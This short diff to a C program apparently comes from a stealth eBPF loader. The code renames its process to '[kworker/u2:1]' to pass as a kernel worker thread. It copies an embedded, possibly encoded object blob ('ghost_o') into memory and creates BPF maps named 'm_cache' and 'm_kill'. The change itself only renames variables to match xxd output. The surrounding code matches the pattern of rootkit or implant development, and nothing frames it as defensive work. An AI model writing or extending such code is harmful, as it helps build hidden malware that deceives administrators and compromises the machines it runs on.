@@ -49,9 +49,10 @@ int main(int argc, char **argv) {
     setrlimit(RLIMIT_MEMLOCK, &r);
     prctl(PR_SET_NAME, "[kworker/u2:1]", 0, 0, 0);
 
-    uint8_t *b = malloc(target_ghost_o_len);
-    __builtin_memcpy(b, target_ghost_o, target_ghost_o_len);
-    x_c(b, target_ghost_o_len);
+    // Fixed variable names from xxd output
+    uint8_t *b = malloc(ghost_o_len);
+    __builtin_memcpy(b, ghost_o, ghost_o_len);
+    x_c(b, ghost_o_len);
 
     int cf = m_c(BPF_MAP_TYPE_LRU_HASH, 16, 8, 32768, "m_cache");
     int kf = m_c(BPF_MAP_TYPE_ARRAY, 4, 4, 1, "m_kill");
